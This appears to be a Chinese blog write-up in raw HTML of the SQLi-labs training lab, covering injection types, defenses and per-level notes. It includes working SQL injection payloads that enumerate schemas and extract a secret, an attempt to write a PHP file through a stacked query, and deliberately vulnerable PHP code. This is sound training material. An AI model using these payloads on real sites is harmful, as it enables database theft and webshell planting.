  10 Init DB   security</span><br><span class=\"line\">                   10 Query     SELECT * FROM <span class=\"built_in\">users</span> WHERE <span class=\"built_in\">id</span>=<span class=\"string\">'1'</span>;<span class=\"keyword\">select</span> <span class=\"string\">'&lt;?php phpinfo();?&gt;'</span>#<span class=\"string\">' LIMIT 0,1</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>成功写入，但是可能是权限的问题，没有成功执行。</p>\n<h4 id=\"3-4-2-Less-39\"><a href=\"#3-4-2-Less-39\" class=\"headerlink\" title=\"3.4.2 Less-39\"></a>3.4.2 Less-39</h4><p>无区别</p>\n<h4 id=\"3-4-3-Less-40\"><a href=\"#3-4-3-Less-40\" class=\"headerlink\" title=\"3.4.3 Less-40\"></a>3.4.3 Less-40</h4><p>无区别</p>\n<h4 id=\"3-4-4-Less-41\"><a href=\"#3-4-4-Less-41\" class=\"headerlink\" title=\"3.4.4 Less-41\"></a>3.4.4 Less-41</h4><p>无区别</p>\n<h4 id=\"3-4-5-Less-42\"><a href=\"#3-4-5-Less-42\" class=\"headerlink\" title=\"3.4.5 Less-42\"></a>3.4.5 Less-42</h4><p>类似于<code>Less-24</code>，少了一些过滤。</p>\n<h4 id=\"3-4-6-Less-43\"><a href=\"#3-4-6-Less-43\" class=\"headerlink\" title=\"3.4.6 Less-43\"></a>3.4.6 Less-43</h4><p>无区别。</p>\n<h4 id=\"3-4-7-Less-44\"><a href=\"#3-4-7-Less-44\" class=\"headerlink\" title=\"3.4.7 Less-44\"></a>3.4.7 Less-44</h4><p>无区别。</p>\n<h4 id=\"3-4-8-Less-45\"><a href=\"#3-4-8-Less-45\" class=\"headerlink\" title=\"3.4.8 Less-45\"></a>3.4.8 Less-45</h4><p>无区别。</p>\n<h4 id=\"3-4-9-Less-46\"><a href=\"#3-4-9-Less-46\" class=\"headerlink\" title=\"3.4.9 Less-46\"></a>3.4.9 Less-46</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$id</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">'sort'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">\"SELECT * FROM users ORDER BY <span class=\"subst\">$id</span>\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"string\">\"查询结果\"</span></span><br><span class=\"line\"><span class=\"keyword\">else</span>：</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>\n\n<p><code>order by</code>注入，具体看本文order by注入部分。</p>\n<h4 id=\"3-4-10-Less-47\"><a href=\"#3-4-10-Less-47\" class=\"headerlink\" title=\"3.4.10 Less-47\"></a>3.4.10 Less-47</h4><p>无区别。</p>\n<h4 id=\"3-4-11-Less-48\"><a href=\"#3-4-11-Less-48\" class=\"headerlink\" title=\"3.4.11 Less-48\"></a>3.4.11 Less-48</h4><p>无区别。</p>\n<h4 id=\"3-4-12-Less-49\"><a href=\"#3-4-12-Less-49\" class=\"headerlink\" title=\"3.4.12 Less-49\"></a>3.4.12 Less-49</h4><p>无区别。</p>\n<h4 id=\"3-4-13-Less-50\"><a href=\"#3-4-13-Less-50\" class=\"headerlink\" title=\"3.4.13 Less-50\"></a>3.4.13 Less-50</h4><p>无区别。</p>\n<h4 id=\"3-4-14-Less-51\"><a href=\"#3-4-14-Less-51\" class=\"headerlink\" title=\"3.4.14 Less-51\"></a>3.4.14 Less-51</h4><p>无区别。</p>\n<h4 id=\"3-4-15-Less-52\"><a href=\"#3-4-15-Less-52\" class=\"headerlink\" title=\"3.4.15 Less-52\"></a>3.4.15 Less-52</h4><p>无区别。</p>\n<h4 id=\"3-4-16-Less-53\"><a href=\"#3-4-16-Less-53\" class=\"headerlink\" title=\"3.4.16 Less-53\"></a>3.4.16 Less-53</h4><p>无区别。</p>\n<h3 id=\"3-5-Less54-65\"><a href=\"#3-5-Less54-65\" class=\"headerlink\" title=\"3.5 Less54-65\"></a>3.5 Less54-65</h3><h4 id=\"3-5-1-Less-54\"><a href=\"#3-5-1-Less-54\" class=\"headerlink\" title=\"3.5.1 Less-54\"></a>3.5.1 Less-54</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$times</span>= <span class=\"number\">10</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'reset'</span>]))</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">setcookie</span>(<span class=\"string\">'challenge'</span>, <span class=\"string\">' '</span>, <span class=\"title function_ invoke__\">time</span>() - <span class=\"number\">3600000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">'challenge'</span>]))</span><br><span class=\"line\">        <span class=\"variable\">$sessid</span>=<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">'challenge'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"variable\">$expire</span> = <span class=\"title function_ invoke__\">time</span>()+<span class=\"number\">60</span>*<span class=\"number\">60</span>*<span class=\"number\">24</span>*<span class=\"number\">30</span>;</span><br><span class=\"line\">        <span class=\"variable\">$hash</span> = <span class=\"title function_ invoke__\">data</span>(<span class=\"variable\">$table</span>,<span class=\"variable\">$col</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">setcookie</span>(<span class=\"string\">\"challenge\"</span>, <span class=\"variable\">$hash</span>, <span class=\"variable\">$expire</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"variable\">$_GET</span>[<span class=\"string\">'id'</span>]:</span><br><span class=\"line\">        <span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM security.users WHERE id='<span class=\"subst\">$id</span>' LIMIT 0,1\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">        <span class=\"string\">\"查询结果\"</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>：</span><br><span class=\"line\">       </span><br><span class=\"line\"><span class=\"variable\">$key</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'key'</span>]);</span><br><span class=\"line\"><span class=\"variable\">$key</span> = <span class=\"title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT 1 FROM <span class=\"subst\">$table</span> WHERE <span class=\"subst\">$col1</span>= '<span class=\"subst\">$key</span>'\"</span>;</span><br></pre></td></tr></tbody></table></figure>\n\n<p>十次以内查出结果</p>\n<p>判断闭合</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">?id=1'</span><span class=\"operator\">%</span><span class=\"number\">23</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>判断字段数</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">'order by 3%23</span></span><br><span class=\"line\"><span class=\"string\">?id=1'</span><span class=\"keyword\">order</span> <span class=\"keyword\">by</span> <span class=\"number\">4</span><span class=\"operator\">%</span><span class=\"number\">23</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>查数据库名</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span><span class=\"string\">'union select 1,2,(select group_concat(schema_name) from information_schema.schemata)%23</span></span><br><span class=\"line\"><span class=\"string\">information_schema,challenges,mysql,performance_schema,security</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>查表名</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span><span class=\"string\">'union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='</span>challenges<span class=\"string\">')%23</span></span><br><span class=\"line\"><span class=\"string\">1KBD9AIPC9</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>查字段名</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span><span class=\"string\">'union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='</span><span class=\"number\">1</span>KBD9AIPC9<span class=\"string\">')%23</span></span><br><span class=\"line\"><span class=\"string\">id,sessid,secret_2TF1,tryy</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>查key值</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">-1</span><span class=\"string\">'union select 1,2,(select concat(secret_2TF1) from challenges.1KBD9AIPC9)%23</span></span><br><span class=\"line\"><span class=\"string\">vJWlm4ld9mZEZN2o7n59t4A8</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>总共八次。</p>\n<h4 id=\"3-5-2-Less-55\"><a href=\"#3-5-2-Less-55\" class=\"headerlink\" title=\"3.5.2 Less-55\"></a>3.5.2 Less-55</h4><p>无区别。</p>\n<h4 id=\"3-5-3-Less-56\"><a href=\"#3-5-3-Less-56\" class=\"headerlink\" title=\"3.5.3 Less-56\"></a>3.5.3 Less-56</h4><p>无区别。</p>\n<h4 id=\"3-5-4-Less-57\"><a href=\"#3-5-4-Less-57\" class=\"headerlink\" title=\"3.5.4 Less-57\"></a>3.5.4 Less-57</h4><p>无区别。</p>\n<h4 id=\"3-5-5-Less-58\"><a href=\"#3-5-5-Less-58\" class=\"headerlink\" title=\"3.5.5 Less-58\"></a>3.5.5 Less-58</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM security.users WHERE id='<span class=\"subst\">$id</span>' LIMIT 0,1\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'Your Login name : '</span>. <span class=\"variable\">$unames</span>[<span class=\"variable\">$row</span>[<span class=\"string\">'id'</span>]];</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'Your Password : '</span> .<span class=\"variable\">$pass</span>[<span class=\"variable\">$row</span>[<span class=\"string\">'id'</span>]];</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>\n\n<p>联合查询没结果输出，改为报错注入。</p>\n<h4 id=\"3-5-6-Less-59\"><a href=\"#3-5-6-Less-59\" class=\"headerlink\" title=\"3.5.6 Less-59\"></a>3.5.6 Less-59</h4><p>无区别。</p>\n<h4 id=\"3-5-7-Less-60\"><a href=\"#3-5-7-Less-60\" class=\"headerlink\" title=\"3.5.7 Less-60\"></a>3.5.7 Less-60</h4><p>无区别。</p>\n<h4 id=\"3-5-8-Less-61\"><a href=\"#3-5-8-Less-61\" class=\"headerlink\" title=\"3.5.8 Less-61\"></a>3.5.8 Less-61</h4><p>无区别。</p>\n<h4 id=\"3-5-9-Less-62\"><a href=\"#3-5-9-Less-62\" class=\"headerlink\" title=\"3.5.9 Less-62\"></a>3.5.9 Less-62</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM security.users WHERE id=('<span class=\"subst\">$id</span>') LIMIT 0,1\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'Your Login name : '</span>. <span class=\"variable\">$unames</span>[<span class=\"variable\">$row</span>[<span class=\"string\">'id'</span>]];</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'Your Password : '</span> .<span class=\"variable\">$pass</span>[<span class=\"variable\">$row</span>[<span class=\"string\">'id'</span>]];</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"comment\">//print_r(mysql_error());</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>不能报错注入了，改为布尔盲注或者时间盲注即可</p>\n<h4 id=\"3-5-9-Less-63\"><a href=\"#3-5-9-Less-63\" class=\"headerlink\" title=\"3.5.9 Less-63\"></a>3.5.9 Less-63</h4><p>无区别。</p>\n<h4 id=\"3-5-10-Less-64\"><a href=\"#3-5-10-Less-64\" class=\"headerlink\" title=\"3.5.10 Less-64\"></a>3.5.10 Less-64</h4><p>无区别。</p>\n<h4 id=\"3-5-1-Less-65\"><a href=\"#3-5-1-Less-65\" class=\"headerlink\" title=\"3.5.1 Less-65\"></a>3.5.1 Less-65</h4><p>无区别。</p>\n<h3 id=\"3-6-总结\"><a href=\"#3-6-总结\" class=\"headerlink\" title=\"3.6 总结\"></a>3.6 总结</h3><p>终于是刷完了，总体来说把每种注入方式都练习了个遍，并学习了一些绕过手法，整个过程除了<code>Less-1</code>跟着大佬把<code>sqlmap</code>使用熟悉了一下，其余均为手注，加强自己的能力，尽量不变成离了脚本就活不了的脚本小子（）。但是其实还有许多利用手法没有学到，以后遇到就在本文填补，避免做完就忘了。</p>\n","length":26967,"excerpt":"","more":"<h2 id=\"1-概述\"><a href=\"#1-概述\" class=\"headerlink\" title=\"1. 概述\"></a>1. 概述</h2><p><strong>漏洞描述</strong></p>\n<p>​\tWeb程序代码中对于用户提交的参数未做过滤，被放到SQL语句中执行，导致参数中的特殊字符打破了 SQL 语句原有逻辑，黑客可以利用该漏洞执行任意 SQL 语句，如查询数据、下载数据、写入 webshell 、执行系统命令以及绕过登录限制等。</p>\n<p><strong>漏洞存在条件</strong></p>\n<ul>\n<li>参数用户可控。</li>\n<li>参数带入数据库查询。</li>\n</ul>\n<p><strong>测试方法</strong></p>\n<p>​\t在发现有可控参数的地方使用 sqlmap 进行 SQL 注入的检查或者利用，也可以使用其他的 SQL 注入工具，简单点的可以手工测试，利用单引号、and1&#x3D;1 和 and 1&#x3D;2 以及字符型注入进行判断。</p>\n<p><strong>修复方法</strong></p>\n<p>​\t在代码层最佳的防御SQL注入的手段是SQL语句的<strong>预编译和绑定变量</strong>。</p>\n<p>​\t（1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。当前几乎所有的数据库系统都提供了参数化 SQL 语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p>\n<p>​\t（2）对进入数据库的特殊字符（ ‘ &lt;&gt;&amp;*; 等）进行转义处理，或编码转换。</p>\n<p>​\t（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为 int 型。</p>\n<p>​\t（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL 注入语句无法正确执行。 </p>\n<p>​\t（5）网站每个数据层的编码统一，建议全部使用 UTF-8 编码，上下层编码不一致有可能导致一些过滤模型被绕过。 </p>\n<p>​\t（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击 对数据库的危害。 </p>\n<p>​\t（7）避免网站显示 SQL 错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p>\n<h3 id=\"1-1-MySQL相关知识\"><a href=\"#1-1-MySQL相关知识\" class=\"headerlink\" title=\"1.1 MySQL相关知识\"></a>1.1 MySQL相关知识</h3><p>​\t在<strong>mysql5</strong>版本以后，存在一个数据库为<code>information_schema</code>，在这个库里面，有三个重要的表：<code>columns</code>，<code>tables</code>，<code>SCHEMATA</code>表，在<code>SCHEMATA</code>表中的字段<code>SCHEMA_NAME</code>存放着数据库的信息。<code>tables</code>表中<code>TABLE_SCHEMA</code>和<code>TABLE_NAME</code>分别记录库名和表名。<code>columns</code>存储该用户创建的所有数据库的库名、表名和字段名。</p>\n<h4 id=\"1-1-1-Navicat连接Docker容器内MySQL\"><a href=\"#1-1-1-Navicat连接Docker容器内MySQL\" class=\"headerlink\" title=\"1.1.1 Navicat连接Docker容器内MySQL\"></a>1.1.1 Navicat连接Docker容器内MySQL</h4><blockquote>\n<p>有这个需求的原因是我太懒了，因为是用的docker开的sqli labs环境，又不想本地再配MySQL环境，因此干脆直接利用了。</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker run -dt --name sqli-labs -p 8888:80 -p 3307:3306 -e MYSQL_ROOT_PASSWORD=root acgpiano/sqli-labs:latest</span><br></pre></td></tr></table></figure>\n\n<p>这里需要给MySQL开一个端口映射，我这里给的是<code>3307</code>端口。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ docker <span class=\"built_in\">exec</span> -it sqli-labs /bin/bash</span><br><span class=\"line\">$ mysql</span><br></pre></td></tr></table></figure>\n\n<p>接下来将host修改为<code>%</code>即可。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> host,<span class=\"keyword\">user</span> <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> <span class=\"keyword\">user</span><span class=\"operator\">=</span><span class=\"string\">&#x27;root&#x27;</span>;</span><br><span class=\"line\">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>\n\n<style>.pienrgywnrhj{zoom:50%;}</style><img src=\"/posts/31899/image-20250306000604769.png\" class=\"pienrgywnrhj\" alt=\"image-20250306000604769\">\n\n\n<h3 id=\"1-2-判断是否存在注入\"><a href=\"#1-2-判断是否存在注入\" class=\"headerlink\" title=\"1.2 判断是否存在注入\"></a>1.2 判断是否存在注入</h3><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> <span class=\"number\">1</span><span class=\"operator\">=</span><span class=\"number\">1</span></span><br><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> <span class=\"number\">1</span><span class=\"operator\">=</span><span class=\"number\">2</span></span><br><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">or</span> <span class=\"number\">1</span><span class=\"operator\">=</span><span class=\"number\">1</span></span><br><span class=\"line\">id<span class=\"operator\">=</span><span class=\"string\">&#x27;1&#x27;</span><span class=\"keyword\">or</span><span class=\"string\">&#x27;1&#x27;</span><span class=\"operator\">=</span><span class=\"string\">&#x27;1&#x27;</span></span><br><span class=\"line\">id<span class=\"operator\">=</span>&quot;1&quot;<span class=\"keyword\">or</span>&quot;1&quot;<span class=\"operator\">=</span>&quot;1&quot;</span><br></pre></td></tr></table></figure>\n\n<p><strong>有回显</strong>：页面有数据信息返回。</p>\n<p><strong>无回显</strong>：输入不同语句，页面无任何变化。</p>\n<h3 id=\"1-3-SQL注释符\"><a href=\"#1-3-SQL注释符\" class=\"headerlink\" title=\"1.3 SQL注释符\"></a>1.3 SQL注释符</h3><p><code>#</code>：单行注释，常编码为%23。</p>\n<p><code>--空格</code>：单行注释，注意后面有个空格。</p>\n<p><code>/**/</code>：多行注释，至少存在两处的注入，也常用来作为空格绕过。</p>\n<h3 id=\"1-4-SQL注入分类\"><a href=\"#1-4-SQL注入分类\" class=\"headerlink\" title=\"1.4 SQL注入分类\"></a>1.4 SQL注入分类</h3><p>按注入手法来分：<strong>联合查询、堆叠查询、布尔型、报错型、基于时间延迟</strong>。</p>\n<p>按请求类型来分：<strong>GET注入、POST注入、COOKIE注入。</strong></p>\n<p>按注入数据类型来分：<strong>int型、string型、like型</strong></p>\n<h4 id=\"1-4-1-报错注入\"><a href=\"#1-4-1-报错注入\" class=\"headerlink\" title=\"1.4.1 报错注入\"></a>1.4.1 报错注入</h4><p><strong>XPATH报错注入</strong></p>\n<p><code>updatexml（XML_document，XPath_string，new_value）</code>、<code>extractvalue（XML_document，xpath_string）</code>，XPATH的格式形如<code>/test</code>，如果XPATH出现格式错误，则会爆出XPATH语法错误。</p>\n<p><strong>floor()函数报错</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"built_in\">count</span>(<span class=\"operator\">*</span>),concat(<span class=\"string\">&#x27;x&#x27;</span>,<span class=\"built_in\">floor</span>(rand(<span class=\"number\">0</span>)<span class=\"operator\">*</span><span class=\"number\">2</span>))x <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">group</span> <span class=\"keyword\">by</span> x</span><br></pre></td></tr></table></figure>\n\n<p><code>rand(0)</code>的重复计算是固定的，会随机生成一个[0,1]的小数，<code>rand(0)*2</code>则生成[0,2]的数，<code>floor()</code>函数是向下取整，即最后结果为0或1。我们运行一下看看。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"built_in\">floor</span>(rand(<span class=\"number\">0</span>)<span class=\"operator\">*</span><span class=\"number\">2</span>) <span class=\"keyword\">from</span> information_schema.tables limit <span class=\"number\">0</span>,<span class=\"number\">8</span>;</span><br></pre></td></tr></table></figure>\n\n<img src=\"/posts/31899/image-20250306001213412.png\" class=\"\" title=\"image-20250306001213412\">\n\n<p>可以发现这里<code>floor(rand(0)*2)</code>的值是固定的。</p>\n<p>接下来说一下<code>group by</code>的原理，<code>group by</code>在执行时，会依次取出查询表中的记录创建一个临时表，<code>group by</code>的对象就是该临时表的主键，如果临时表中出现了该主键，则该值加一，若不存在则<strong>插入</strong>。再来看这个SQL语句。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"built_in\">count</span>(<span class=\"operator\">*</span>),concat(<span class=\"string\">&#x27;x&#x27;</span>,<span class=\"built_in\">floor</span>(rand(<span class=\"number\">0</span>)<span class=\"operator\">*</span><span class=\"number\">2</span>))x <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">group</span> <span class=\"keyword\">by</span> x</span><br></pre></td></tr></table></figure>\n\n<p>其键必然为<code>x1</code>或者<code>x0</code>，那么应该只会值增加呀，为什么会报错呢？</p>\n<p>这里有个重要特性：当<code>group by</code>和<code>rand()</code>同时使用时，若该临时表中没有主键，则插入前<code>rand()</code>会再执行一次。</p>\n<p>那么我们来推断一下，第一次执行，<code>key</code>应该为<code>x0</code>，但是<code>x0</code>不存在，因此<code>rand(0)</code>又计算了一遍，最终第一次执行结果为<code>x1</code>。</p>\n<p>第二次执行，这时候<code>key</code>应该为<code>x1</code>，已存在，则值加一即可。</p>\n<p>第三次执行，这时候key应该为<code>x0</code>，不存在，<code>rand(0)</code>重新计算一遍，最终应该插入的<code>key</code>为<code>x1</code>，这里就出了问题了，它会直接插入，从而导致主键重复报错，这就是该报错原理。</p>\n<img src=\"/posts/31899/image-20250306003105176.png\" class=\"\" title=\"image-20250306003105176\">\n\n<p><strong>优化方案</strong></p>\n<p>学习的<a href=\"https://www.freebuf.com/articles/web/257881.html\">这篇文章</a>，将<code>rand(0)</code>改为了<code>rand(14)</code>，运行一下看看。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql<span class=\"operator\">&gt;</span> <span class=\"keyword\">select</span> <span class=\"built_in\">floor</span>(rand(<span class=\"number\">14</span>)<span class=\"operator\">*</span><span class=\"number\">2</span>) <span class=\"keyword\">from</span> information_schema.tables limit <span class=\"number\">0</span>,<span class=\"number\">8</span>;</span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">-------------------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span> <span class=\"built_in\">floor</span>(rand(<span class=\"number\">14</span>)<span class=\"operator\">*</span><span class=\"number\">2</span>) <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">-------------------+</span></span><br><span class=\"line\"><span class=\"operator\">|</span>                 <span class=\"number\">1</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span>                 <span class=\"number\">0</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span>                 <span class=\"number\">1</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span>                 <span class=\"number\">0</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span>                 <span class=\"number\">0</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span>                 <span class=\"number\">0</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span>                 <span class=\"number\">1</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">|</span>                 <span class=\"number\">1</span> <span class=\"operator\">|</span></span><br><span class=\"line\"><span class=\"operator\">+</span><span class=\"comment\">-------------------+</span></span><br><span class=\"line\"><span class=\"number\">8</span> <span class=\"keyword\">rows</span> <span class=\"keyword\">in</span> <span class=\"keyword\">set</span> (<span class=\"number\">0.00</span> sec)</span><br></pre></td></tr></table></figure>\n\n<p>这里只需要两条数据即可报错，但是如果只有一条数据<code>floor()</code>报错注入就不能用了，因为一条数据没办法重复。</p>\n<h4 id=\"1-4-2-ORDER-BY注入\"><a href=\"#1-4-2-ORDER-BY注入\" class=\"headerlink\" title=\"1.4.2 ORDER BY注入\"></a>1.4.2 ORDER BY注入</h4><p>主要是不能使用联合注入，还有一些函数区别。</p>\n<p><strong>验证方式</strong></p>\n<p>升序降序</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?sort<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">asc</span> # 升序</span><br><span class=\"line\">?sort<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">desc</span> # 降序</span><br></pre></td></tr></table></figure>\n\n<p><code>rand()</code>函数验证，<code>rand()</code>每次结果随机，因此查询出结果顺序也是随机。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span 